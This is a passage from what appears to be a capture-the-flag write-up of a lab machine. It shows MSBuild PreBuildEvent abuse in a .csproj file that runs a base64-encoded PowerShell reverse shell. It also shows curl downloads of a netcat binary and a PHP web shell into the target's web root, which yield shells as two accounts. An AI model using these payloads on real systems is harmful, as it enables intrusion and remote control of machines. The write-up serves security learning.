+10.129.229.122 - - [2024-02-03 17:14:50] &quot;POST /test.git/git-upload-pack HTTP/1.1&quot; 200 4356 0.007766</span></span></span></code></pre><div id="https://www.notion.so/1d2341f026ed4e349620c8dbd3578eb3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And the build also succeeded, allowing us to download the compiled binaries from the webserver.</span></span></p></div><div id="https://www.notion.so/82be8d5dcada44bb82a6cfe677b8c976" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2bbf4858-c893-45f5-b459-30ec5d626f20%2FUntitled.png?width=1044&amp;table=block&amp;id=82be8d5d-cada-44bb-82a6-cfe677b8c976"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F2bbf4858-c893-45f5-b459-30ec5d626f20%2FUntitled.png?width=1044&amp;table=block&amp;id=82be8d5d-cada-44bb-82a6-cfe677b8c976" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d50d0787567646bd901b6baa24e20c64" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5135c066db3046778614b2c69fba78b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">MSBuild Process:</strong></span></span></p></div><div id="https://www.notion.so/01a44e84873540089c9cbaf1baaf148c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Microsoft </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/visualstudio/msbuild/build-process-overview?view=vs-2022">MSBuild documentation</a></span><span class="SemanticString"> provides a detailed explanation on the build process. In short, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.sln</code></span><span class="SemanticString"> file contains the list of projects within the Visual Studio solution as well as the dependencies between them, while the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.csproj</code></span><span class="SemanticString"> file defines the structure and configurations for each individual project. MSBuild would read these files to determine the dependencies and build order, and accordingly compile them into the target binaries.</span></span></p></div><div id="https://www.notion.so/67e3324f7fd94605ba49d6e0aa9d131f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/39846243c263474289e5abd8090cc3f6" class="Divider"></div><h3 id="https://www.notion.so/85032529c8654958af692ae2f756a7e0" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/85032529c8654958af692ae2f756a7e0"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/2b513409f8274c09987cea089ea07947" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PreBuildEvent Abuse:</strong></span></span></p></div><div id="https://www.notion.so/99dd5cfff8ba42e6827966c7640e1d5f" class="Bookmark"><a href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022"><h5 class="Bookmark__Title">Specify build events (C#) - Visual Studio (Windows)</h5><p class="Bookmark__Desc">Use build events in Visual Studio to specify commands that run before the build starts or after the build finishes for C# programs.</p><p class="Bookmark__Link">https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022</p></a></div><div id="https://www.notion.so/acf19b397caf4cf9a581dbd5c31b8d39" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In MSBuild, there’s a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PreBuildEvent</code></span><span class="SemanticString"> property, which can be defined in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.csproj</code></span><span class="SemanticString"> file, that allows developers to specify a series of commands to be executed before the main build process begins. Since we have control of the project to be compiled by the app, we can modify the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.csproj</code></span><span class="SemanticString"> file and make it run any OS commands of our choice. This </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/">blog post</a></span><span class="SemanticString"> explains the attack pretty well.</span></span></p></div><div id="https://www.notion.so/c5e1efcdf945448b8ab21c27e6a477de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to the test project above, I’ll create a new console project named “exploit”:</span></span></p></div><pre id="https://www.notion.so/9286303ce04a4896a9759a8af759a499" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../exploitation/http-git-server/repos]
+└─$</span></mark></span><span class="SemanticString"><span> mkdir exploit.git &amp;&amp; cd exploit.git
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/exploit.git]
+└─$</span></mark></span><span class="SemanticString"><span> dotnet new console -n exploit &amp;&amp; dotnet new sln -n exploit &amp;&amp; dotnet sln add exploit/exploit.csproj
+
+The template &quot;Console App&quot; was created successfully.
+
+Processing post-creation actions...
+Running &#x27;dotnet restore&#x27; on /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/exploit.git/exploit/exploit.csproj...
+  Determining projects to restore...
+  Restored /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/exploit.git/exploit/exploit.csproj (in 86 ms).
+Restore succeeded.
+
+
+The template &quot;Solution File&quot; was created successfully.
+
+Project `exploit/exploit.csproj` added to the solution.</span></span></span></code></pre><div id="https://www.notion.so/b075878399b9412e9ab87e51572fcfe3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.csproj</code></span><span class="SemanticString"> file, I’ll add a PreBuildEvent that sends a GET request to my HTTP server on port 8000:</span></span></p></div><pre id="https://www.notion.so/adc0226f65694e37a3885e32156d031d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Project</span> <span class="token attr-name">Sdk</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Microsoft.NET.Sdk<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PropertyGroup</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OutputType</span><span class="token punctuation">></span></span>Exe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OutputType</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TargetFramework</span><span class="token punctuation">></span></span>net6.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TargetFramework</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ImplicitUsings</span><span class="token punctuation">></span></span>enable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ImplicitUsings</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Nullable</span><span class="token punctuation">></span></span>enable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Nullable</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PropertyGroup</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Target</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PreBuild<span class="token punctuation">"</span></span> <span class="token attr-name">BeforeTargets</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PreBuildEvent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Exec</span> <span class="token attr-name">Command</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>curl http://10.10.14.28:8000<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Target</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Project</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/308fcdbf4b3c40d8af0a3add367e5277" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, I’ll put the folder under git control, and commit all my changes.</span></span></p></div><pre id="https://www.notion.so/d26a4824672c4a4f89d88f780e46f81b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/exploit.git]
+└─$</span></mark></span><span class="SemanticString"><span> git init
+
+hint: Using &#x27;master&#x27; as the name for the initial branch. This default branch name
+hint: is subject to change. To configure the initial branch name to use in all
+hint: of your new repositories, which will suppress this warning, call:
+hint: 
+hint: 	git config --global init.defaultBranch &lt;name&gt;
+hint: 
+hint: Names commonly chosen instead of &#x27;master&#x27; are &#x27;main&#x27;, &#x27;trunk&#x27; and
+hint: &#x27;development&#x27;. The just-created branch can be renamed via this command:
+hint: 
+hint: 	git branch -m &lt;name&gt;
+Initialized empty Git repository in /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/exploit.git/.git/
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/exploit.git]
+└─$</span></mark></span><span class="SemanticString"><span> git add * &amp;&amp; git commit -m &#x27;init&#x27;
+
+[master (root-commit) e7cab26] init
+ 8 files changed, 221 insertions(+)
+ create mode 100644 exploit.sln
+ create mode 100644 exploit/Program.cs
+ create mode 100644 exploit/exploit.csproj
+ create mode 100644 exploit/obj/exploit.csproj.nuget.dgspec.json
+ create mode 100644 exploit/obj/exploit.csproj.nuget.g.props
+ create mode 100644 exploit/obj/exploit.csproj.nuget.g.targets
+ create mode 100644 exploit/obj/project.assets.json
+ create mode 100644 exploit/obj/project.nuget.cache </span></span></span></code></pre><div id="https://www.notion.so/344bec79eda34970a086b050a3d2d6e5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After sending the URL to the web app, a GET request is detected on the HTTP server. We have RCE!</span></span></p></div><pre id="https://www.notion.so/51e90e182f2940f28befef0153341521" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.229.122 - - [03/Feb/2024 17:26:04] &quot;GET / HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/80a96acfb7a64f2e8f471ed9a85aed1e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With this, it’s time to get a shell back. I’ll replace the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> command with a PowerShell reverse shell payload (generated </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.revshells.com/">here</a></span><span class="SemanticString">), and commit the change.</span></span></p></div><pre id="https://www.notion.so/2fc28662b77447e7b391745d90f41f6c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Project</span> <span class="token attr-name">Sdk</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Microsoft.NET.Sdk<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PropertyGroup</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OutputType</span><span class="token punctuation">></span></span>Exe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>OutputType</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TargetFramework</span><span class="token punctuation">></span></span>net6.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TargetFramework</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ImplicitUsings</span><span class="token punctuation">></span></span>enable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ImplicitUsings</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Nullable</span><span class="token punctuation">></span></span>enable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Nullable</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PropertyGroup</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Target</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PreBuild<span class="token punctuation">"</span></span> <span class="token attr-name">BeforeTargets</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PreBuildEvent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Exec</span> <span class="token attr-name">Command</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA4ACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Target</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Project</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/4c8009f501654b67af35d8b0684e2b19" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/48a40b6dc01546ce8b3dad244be17182" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/exploit.git]
+└─$</span></mark></span><span class="SemanticString"><span> git add exploit/exploit.csproj &amp;&amp; git commit -m &#x27;revshell&#x27;
+
+[master e16f71e] revshell
+ 1 file changed, 1 insertion(+), 1 deletion(-)</span></span></span></code></pre><div id="https://www.notion.so/7b5acc8276b94ddc881a16c6b0750947" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After setting up the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netcat</code></span><span class="SemanticString"> listener, I’ll send the URL to the web app for building.</span></span></p></div><div id="https://www.notion.so/c490d55c6d884fa29f71ea27ede19e57" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ rlwrap nc -lvnp 8001</code></span><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/d2ac31349c5549d7bc632cf6ceb9f32f" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8799ab2f-9765-493e-a138-b8abec5cf010%2FUntitled.png?width=635&amp;table=block&amp;id=d2ac3134-9c55-49d7-bc63-2cf6ceb9f32f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8799ab2f-9765-493e-a138-b8abec5cf010%2FUntitled.png?width=635&amp;table=block&amp;id=d2ac3134-9c55-49d7-bc63-2cf6ceb9f32f" style="width:635px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e9d80e304a08457d93883a980f239703" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As expected, a shell is sent back, and we have foothold on the box as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enox</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1073daf5139e406a890be210695db460" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/visual]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.28] from (UNKNOWN) [10.129.229.122] 49678
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\enox\documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+visual\enox</span></span></span></code></pre><div id="https://www.notion.so/f206488c2f41423baa205da275013a55" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f72d958f40d740dfbc749538269ee97c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/95736f4a1e004d8d801f584af3ebd94d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\enox\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt
+
+1c300174************************</span></span></span></code></pre><div id="https://www.notion.so/42f412ee1cb341b5abf8b41add7ecf0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/22afc9c8668c405d9ec5a15ffd75ea21" class="Divider"></div><h3 id="https://www.notion.so/abff4d2a06de47ad92b1d9d4290faaf0" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/abff4d2a06de47ad92b1d9d4290faaf0"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">enox</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/0c575c8d105f4ad2a40b242b8e817160" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Web Root:</strong></span></span></p></div><div id="https://www.notion.so/a50af4c8cc464082a1e18c6d02de6ef8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">3 PHP files are found in the web root.</span></span></p></div><pre id="https://www.notion.so/92094d3518494eca9bc7b1f89dbc96f1" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+    Directory: C:\xampp\htdocs
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        6/10/2023  10:32 AM                assets                                                                
+d-----        6/10/2023  10:32 AM                css                                                                   
+d-----        6/10/2023  10:32 AM                js                                                                    
+d-----         2/2/2024  11:02 PM                uploads                                                               
+-a----        6/10/2023   6:20 PM           7534 index.php                                                             
+-a----        6/10/2023   4:17 PM           1554 submit.php                                                            
+-a----        6/10/2023   4:11 PM           4970 vs_status.php</span></span></span></code></pre><div id="https://www.notion.so/98acc1a350dc4e6fb6a09e1f690a41bc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, the user has full access to the web root, since it’s in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Everyone</code></span><span class="SemanticString"> group. With service accounts on Windows (web, database, etc.), they typically have </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString">, which can be exploited by the infamous Potato attacks for escalation.</span></span></p></div><pre id="https://www.notion.so/eba27ed143ca495791f4d08113fee6bb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> icacls c:\xampp\htdocs
+
+c:\xampp\htdocs Everyone:(OI)(CI)(F)
+                Everyone:(I)(OI)(CI)(F)
+                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                BUILTIN\Administrators:(I)(OI)(CI)(F)
+                BUILTIN\Users:(I)(OI)(CI)(RX)
+                BUILTIN\Users:(I)(CI)(AD)
+                BUILTIN\Users:(I)(CI)(WD)
+                CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files</span></span></span></code></pre><div id="https://www.notion.so/cfefb8390d3840c9bd94d3e3c8895883" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the write access, I can take over the service account running the web app via a PHP web shell.</span></span></p></div><div id="https://www.notion.so/c48f41b3c3d044a8810a65baeaeda7f6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First I downloaded both the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/int0x33/nc.exe/">nc binary</a></span><span class="SemanticString"> and </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/flozz/p0wny-shell">p0wnyshell</a></span><span class="SemanticString"> to the web root:</span></span></p></div><pre id="https://www.notion.so/603d804727a449e9b7b3fb94b67c5f9a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.28:8000/nc64.exe -o nc64.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\xampp\htdocs&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.28:8000/shell.php -o shell.php</span></span></span></code></pre><div id="https://www.notion.so/e8c0decf6c51408fae2c76a13cf01361" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I ran a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> reverse shell payload via the uploaded web shell:</span></span></p></div><div id="https://www.notion.so/e6350ba51b854c9fbdffd1d9e6eb0cb1" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3e1761b7-3568-41fa-b133-bdfda6c64aab%2FUntitled.png?width=659&amp;table=block&amp;id=e6350ba5-1b85-4c9f-bdff-d1d9e6eb0cb1"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3e1761b7-3568-41fa-b133-bdfda6c64aab%2FUntitled.png?width=659&amp;table=block&amp;id=e6350ba5-1b85-4c9f-bdff-d1d9e6eb0cb1" style="width:659px"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">http://10.129.229.122/shell.php</span></span></figcaption></figure></div><div id="https://www.notion.so/de1f4f7214a34053924372beb4dd017c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And another shell session got sent back, this time as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nt authority\local service</code></span><span 